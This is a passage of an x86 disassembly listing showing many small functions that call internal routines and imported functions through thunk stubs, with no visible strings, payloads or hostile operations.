  4d10f0:	add    esp,0x4
  4d10f3:	pop    edi
  4d10f4:	push   edi
  4d10f5:	mov    ebx,0x0
  4d10fa:	push   ebx
  4d10fb:	call   0x4d0f6c
  4d1100:	add    esp,0x4
  4d1103:	pop    edi
  4d1104:	add    esp,0x40
  4d1107:	pop    ebp
  4d1108:	ret    
  4d1109:	add    BYTE PTR [eax],al
  4d110b:	add    BYTE PTR [edi-0x1],bl
  4d110e:	adc    eax,0x4d2048
  4d1113:	call   edi
  4d1115:	add    BYTE PTR [eax],al
  4d1117:	add    BYTE PTR [edi-0x1],bl
  4d111a:	adc    eax,0x4d2068
  4d111f:	call   edi
  4d1121:	add    BYTE PTR [eax],al
  4d1123:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1129:	sub    esp,0x38
  4d112c:	lea    ecx,ds:0x4d3180
  4d1132:	xor    edx,0x6d
  4d1135:	push   ecx
  4d1136:	push   DWORD PTR [ecx+0x8c]
  4d113c:	push   edi
  4d113d:	call   0x4d11b0
  4d1142:	add    esp,0x8
  4d1145:	pop    ecx
  4d1146:	push   ecx
  4d1147:	call   0x4d1588
  4d114c:	add    esp,0x4
  4d114f:	pop    ecx
  4d1150:	push   ecx
  4d1151:	mov    edx,0x0
  4d1156:	push   edx
  4d1157:	call   0x4d0ed8
  4d115c:	add    esp,0x4
  4d115f:	pop    ecx
  4d1160:	add    esp,0x38
  4d1163:	pop    ebp
  4d1164:	ret    
  4d1165:	add    BYTE PTR [eax],al
  4d1167:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d116d:	sub    esp,0x24
  4d1170:	lea    esi,[ebx+0x34]
  4d1173:	cmp    esi,0x32ab
  4d1179:	jbe    0x4d116b
  4d117b:	push   0x0
  4d117d:	call   0x4d110c
  4d1182:	add    esp,0x4
  4d1185:	push   esi
  4d1186:	push   edi
  4d1187:	push   DWORD PTR [esi+0x74]
  4d118a:	push   edi
  4d118b:	call   0x4d1374
  4d1190:	add    esp,0xc
  4d1193:	pop    esi
  4d1194:	push   0x0
  4d1196:	call   0x4d0ed8
  4d119b:	add    esp,0x4
  4d119e:	add    esp,0x24
  4d11a1:	pop    ebp
  4d11a2:	ret    
  4d11a3:	add    BYTE PTR [edi-0x1],bl
  4d11a6:	adc    eax,0x4d2010
  4d11ab:	call   edi
  4d11ad:	add    BYTE PTR [eax],al
  4d11af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11b5:	sub    esp,0x1c
  4d11b8:	lea    esi,ds:0x4d3164
  4d11be:	xor    DWORD PTR [ebp-0x8],0xffff86a0
  4d11c5:	call   0x4d1588
  4d11ca:	add    esp,0x4
  4d11cd:	push   esi
  4d11ce:	push   ecx
  4d11cf:	push   edi
  4d11d0:	push   ecx
  4d11d1:	call   0x4d10b8
  4d11d6:	add    esp,0xc
  4d11d9:	pop    esi
  4d11da:	mov    edi,0x0
  4d11df:	push   edi
  4d11e0:	call   0x4d1060
  4d11e5:	add    esp,0x4
  4d11e8:	add    esp,0x1c
  4d11eb:	pop    ebp
  4d11ec:	ret    
  4d11ed:	add    BYTE PTR [eax],al
  4d11ef:	add    BYTE PTR [edi-0x1],bl
  4d11f2:	adc    eax,0x4d20a0
  4d11f7:	call   edi
  4d11f9:	add    BYTE PTR [eax],al
  4d11fb:	add    BYTE PTR [edi-0x1],bl
  4d11fe:	adc    eax,0x4d2078
  4d1203:	call   edi
  4d1205:	add    BYTE PTR [eax],al
  4d1207:	add    BYTE PTR [edi-0x1],bl
  4d120a:	adc    eax,0x4d2020
  4d120f:	call   edi
  4d1211:	add    BYTE PTR [eax],al
  4d1213:	add    BYTE PTR [edi-0x1],bl
  4d1216:	adc    eax,0x4d2088
  4d121b:	call   edi
  4d121d:	add    BYTE PTR [eax],al
  4d121f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1225:	sub    esp,0x24
  4d1228:	lea    edi,ds:0x4d314c
  4d122e:	sbb    DWORD PTR [edi-0x10],ebx
  4d1231:	push   edi
  4d1232:	push   0x0
  4d1234:	call   0x4d1060
  4d1239:	add    esp,0x4
  4d123c:	pop    edi
  4d123d:	push   edi
  4d123e:	push   DWORD PTR [edi+0x174]
  4d1244:	push   DWORD PTR [edi+0x13c]
  4d124a:	push   esi
  4d124b:	call   0x4d0828
  4d1250:	add    esp,0xc
  4d1253:	pop    edi
  4d1254:	push   edi
  4d1255:	push   0x0
  4d1257:	call   0x4d0ed8
  4d125c:	add    esp,0x4
  4d125f:	pop    edi
  4d1260:	add    esp,0x24
  4d1263:	pop    ebp
  4d1264:	ret    
  4d1265:	add    BYTE PTR [eax],al
  4d1267:	add    BYTE PTR [edi-0x1],bl
  4d126a:	adc    eax,0x4d2060
  4d126f:	call   edi
  4d1271:	add    BYTE PTR [eax],al
  4d1273:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1279:	sub    esp,0x30
  4d127c:	lea    ecx,ds:0x4d301c
  4d1282:	add    DWORD PTR [ecx+0xec],0x39c
  4d128c:	push   ecx
  4d128d:	mov    edx,0x0
  4d1292:	push   edx
  4d1293:	call   0x4d0f6c
  4d1298:	add    esp,0x4
  4d129b:	pop    ecx
  4d129c:	push   ecx
  4d129d:	push   DWORD PTR [ecx+0x11c]
  4d12a3:	push   DWORD PTR [ecx+0x8]
  4d12a6:	push   eax
  4d12a7:	call   0x4d1464
  4d12ac:	add    esp,0xc
  4d12af:	pop    ecx
  4d12b0:	push   ecx
  4d12b1:	push   0x0
  4d12b3:	call   0x4d0ed8
  4d12b8:	add    esp,0x4
  4d12bb:	pop    ecx
  4d12bc:	add    esp,0x30
  4d12bf:	pop    ebp
  4d12c0:	ret    
  4d12c1:	add    BYTE PTR [eax],al
  4d12c3:	add    BYTE PTR [edi-0x1],bl
  4d12c6:	adc    eax,0x4d2080
  4d12cb:	call   edi
  4d12cd:	add    BYTE PTR [eax],al
  4d12cf:	add    BYTE PTR [edi-0x1],bl
  4d12d2:	adc    eax,0x4d2098
  4d12d7:	call   edi
  4d12d9:	add    BYTE PTR [eax],al
  4d12db:	add    BYTE PTR [edi-0x1],bl
  4d12de:	adc    eax,0x4d2074
  4d12e3:	call   edi
  4d12e5:	add    BYTE PTR [eax],al
  4d12e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12ed:	sub    esp,0x44
  4d12f0:	lea    edi,[edx-0x13c]
  4d12f6:	sbb    eax,DWORD PTR [edi+0x7c]
  4d12f9:	push   edi
  4d12fa:	push   DWORD PTR [edi+0x10c]
  4d1300:	push   DWORD PTR [edi+0x13c]
  4d1306:	push   DWORD PTR [edi+0x88]
  4d130c:	call   0x4d0a58
  4d1311:	add    esp,0xc
  4d1314:	pop    edi
  4d1315:	push   edi
  4d1316:	call   0x4d1588
  4d131b:	add    esp,0x4
  4d131e:	pop    edi
  4d131f:	push   edi
  4d1320:	mov    edi,0x0
  4d1325:	push   edi
  4d1326:	call   0x4d0ed8
  4d132b:	add    esp,0x4
  4d132e:	pop    edi
  4d132f:	add    esp,0x44
  4d1332:	pop    ebp
  4d1333:	ret    
  4d1334:	mov    edi,edi
  4d1336:	push   ebp
  4d1337:	mov    ebp,esp
  4d1339:	sub    esp,0x24
  4d133c:	lea    eax,ds:0x4d3098
  4d1342:	and    ebx,0x69b
  4d1348:	push   eax
  4d1349:	push   DWORD PTR [eax+0xec]
  4d134f:	push   DWORD PTR [eax+0x60]
  4d1352:	call   0x4d1220
  4d1357:	add    esp,0x8
  4d135a:	pop    eax
  4d135b:	push   eax
  4d135c:	call   0x4d1588
  4d1361:	add    esp,0x4
  4d1364:	pop    eax
  4d1365:	push   eax
  4d1366:	call   0x4d1558
  4d136b:	add    esp,0x4
  4d136e:	pop    eax
  4d136f:	add    esp,0x24
  4d1372:	pop    ebp
  4d1373:	ret    
  4d1374:	mov    edi,edi
  4d1376:	push   ebp
  4d1377:	mov    ebp,esp
  4d1379:	sub    esp,0x38
  4d137c:	lea    ecx,ds:0x4d31e0
  4d1382:	sub    eax,DWORD PTR [ecx-0x80]
  4d1388:	push   ecx
  4d1389:	mov    esi,0x0
  4d138e:	push   esi
  4d138f:	call   0x4d12c4
  4d1394:	add    esp,0x4
  4d1397:	pop    ecx
  4d1398:	push   ecx
  4d1399:	push   edx
  4d139a:	push   DWORD PTR [ecx+0x20]
  4d139d:	push   ebx
  4d139e:	push   ebx
  4d139f:	call   0x4d1014
  4d13a4:	add    esp,0x10
  4d13a7:	pop    ecx
  4d13a8:	push   ecx
  4d13a9:	mov    ecx,0x0
  4d13ae:	push   ecx
  4d13af:	call   0x4d12dc
  4d13b4:	add    esp,0x4
  4d13b7:	pop    ecx
  4d13b8:	add    esp,0x38
  4d13bb:	pop    ebp
  4d13bc:	ret    
  4d13bd:	add    BYTE PTR [eax],al
  4d13bf:	add    BYTE PTR [edi-0x1],bl
  4d13c2:	adc    eax,0x4d2044
  4d13c7:	call   edi
  4d13c9:	add    BYTE PTR [eax],al
  4d13cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13d1:	sub    esp,0x5c
  4d13d4:	lea    ebx,ds:0x4d31ac
  4d13da:	or     DWORD PTR [ebp-0x5c],0x2e37
  4d13e1:	push   0x0
  4d13e3:	call   0x4d12dc
  4d13e8:	add    esp,0x4
  4d13eb:	push   ebx
  4d13ec:	push   DWORD PTR [ebx+0x124]
  4d13f2:	push   esi
  4d13f3:	call   0x4d0b80
  4d13f8:	add    esp,0x8
  4d13fb:	pop    ebx
  4d13fc:	mov    edx,0x0
  4d1401:	push   edx
  4d1402:	call   0x4d1060
  4d1407:	add    esp,0x4
  4d140a:	add    esp,0x5c
  4d140d:	pop    ebp
  4d140e:	ret    
  4d140f:	add    BYTE PTR [edi-0x1],bl
  4d1412:	adc    eax,0x4d2070
  4d1417:	call   edi
  4d1419:	add    BYTE PTR [eax],al
  4d141b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1421:	sub    esp,0x54
  4d1424:	lea    ebx,ds:0x4d315c
  4d142a:	adc    DWORD PTR [ebp-0x1c],ecx
  4d142d:	mov    edi,0x0
  4d1432:	push   edi
  4d1433:	call   0x4d154c
  4d1438:	add    esp,0x4
  4d143b:	push   ebx
  4d143c:	push   DWORD PTR [ebx+0x1d8]
  4d1442:	push   DWORD PTR [ebx+0xc4]
  4d1448:	call   0x4d0d68
  4d144d:	add    esp,0x8
  4d1450:	pop    ebx
  4d1451:	mov    eax,0x0
  4d1456:	push   eax
  4d1457:	call   0x4d12c4
  4d145c:	add    esp,0x4
  4d145f:	add    esp,0x54
  4d1462:	pop    ebp
  4d1463:	ret    
  4d1464:	mov    edi,edi
  4d1466:	push   ebp
  4d1467:	mov    ebp,esp
  4d1469:	sub    esp,0x4c
  4d146c:	mov    ebx,0x4d30f4
  4d1471:	cmp    ebx,0x5a81
  4d1477:	je     0x4d1467
  4d1479:	push   ebx
  4d147a:	push   DWORD PTR [ebx+0x10c]
  4d1480:	push   DWORD PTR [ebx+0x1d4]
  4d1486:	push   eax
  4d1487:	push   ecx
  4d1488:	call   0x4d15ac
  4d148d:	add    esp,0x10
  4d1490:	pop    ebx
  4d1491:	push   0x0
  4d1493:	call   0x4d1060
  4d1498:	add    esp,0x4
  4d149b:	call   0x4d1588
  4d14a0:	add    esp,0x4
  4d14a3:	add    esp,0x4c
  4d14a6:	pop    ebp
  4d14a7:	ret    
  4d14a8:	mov    edi,edi
  4d14aa:	push   ebp
  4d14ab:	mov    ebp,esp
  4d14ad:	sub    esp,0x50
  4d14b0:	lea    esi,[edi-0xfc]
  4d14b6:	mov    ecx,ebx
  4d14b8:	push   esi
  4d14b9:	push   DWORD PTR [esi+0x110]
  4d14bf:	push   ecx
  4d14c0:	push   DWORD PTR [esi+0x190]
  4d14c6:	call   0x4d0e4c
  4d14cb:	add    esp,0xc
  4d14ce:	pop    esi
  4d14cf:	mov    edx,0x0
  4d14d4:	push   edx
  4d14d5:	call   0x4d0ed8
  4d14da:	add    esp,0x4
  4d14dd:	push   0x0
  4d14df:	call   0x4d1208
  4d14e4:	add    esp,0x4
  4d14e7:	add    esp,0x50
  4d14ea:	pop    ebp
  4d14eb:	ret    
  4d14ec:	pop    edi
  4d14ed:	call   DWORD PTR ds:0x4d200c
  4d14f3:	call   edi
  4d14f5:	add    BYTE PTR [eax],al
  4d14f7:	add    BYTE PTR [edi-0x1],bl
  4d14fa:	adc    eax,0x4d2000
  4d14ff:	call   edi
  4d1501:	add    BYTE PTR [eax],al
  4d1503:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1509:	sub    esp,0x20
  4d150c:	lea    ecx,[esi-0xcc]
  4d1512:	add    esi,edi
  4d1514:	push   ecx
  4d1515:	push   edx
  4d1516:	push   DWORD PTR [ecx+0xcc]
  4d151c:	call   0x4d0974
  4d1521:	add    esp,0x8
  4d1524:	pop    ecx
  4d1525:	push   ecx
  4d1526:	mov    esi,0x0
  4d152b:	push   esi
  4d152c:	call   0x4d0ed8
  4d1531:	add    esp,0x4
  4d1534:	pop    ecx
  4d1535:	push   ecx
  4d1536:	mov    edi,0x0
  4d153b:	push   edi
  4d153c:	call   0x4d0f6c
  4d1541:	add    esp,0x4
  4d1544:	pop    ecx
  4d1545:	add    esp,0x20
  4d1548:	pop    ebp
  4d1549:	ret    
  4d154a:	add    BYTE PTR [eax],al
  4d154c:	pop    edi
  4d154d:	call   DWORD PTR ds:0x4d2064
  4d1553:	call   edi
  4d1555:	add    BYTE PTR [eax],al
  4d1557:	add    BYTE PTR [edi-0x1],bl
  4d155a:	adc    eax,0x4d2034
  4d155f:	call   edi
  4d1561:	add    BYTE PTR [eax],al
  4d1563:	add    BYTE PTR [edi-0x1],bl
  4d1566:	adc    eax,0x4d2028
  4d156b:	call   edi
  4d156d:	add    BYTE PTR [eax],al
  4d156f:	add    BYTE PTR [edi-0x1],bl
  4d1572:	adc    eax,0x4d2008
  4d1577:	call   edi
  4d1579:	add    BYTE PTR [eax],al
  4d157b:	add    BYTE PTR [edi-0x1],bl
  4d157e:	adc    eax,0x4d201c
  4d1583:	call   edi
  4d1585:	add    BYTE PTR [eax],al
  4d1587:	add    BYTE PTR [edi-0x1],bl
  4d158a:	adc    eax,0x4d2030
  4d158f:	call   edi
  4d1591:	add    BYTE PTR [eax],al
  4d1593:	add    BYTE PTR [edi-0x1],bl
  4d1596:	adc    eax,0x4d2014
  4d159b:	call   edi
  4d159d:	add    BYTE PTR [eax],al
  4d159f:	add    BYTE PTR [edi-0x1],bl
  4d15a2:	adc    eax,0x4d2024
  4d15a7:	call   edi
  4d15a9:	add    BYTE PTR [eax],al
  4d15ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d15b1:	sub    esp,0x60
  4d15b4:	lea    edi,ds:0x4d3140
  4d15ba:	add    DWORD PTR [ebp-0x34],esi
  4d15bd:	push   edi
  4d15be:	push   0x0
  4d15c0:	call   0x4d12c4
  4d15c5:	add    esp,0x4
  4d15c8:	pop    edi
  4d15c9:	push   edi
  4d15ca:	push   esi
  4d15cb:	push   DWORD PTR [edi+0x184]
  4d15d1:	call   0x4d14a8
  4d15d6:	add    esp,0x8
  4d15d9:	pop    edi
  4d15da:	push   edi
  4d15db:	push   0x0
  4d15dd:	call   0x4d0f6c
  4d15e2:	add    esp,0x4
  4d15e5:	pop    edi
  4d15e6:	add    esp,0x60
  4d15e9:	pop    ebp
  4d15ea:	ret    
	...
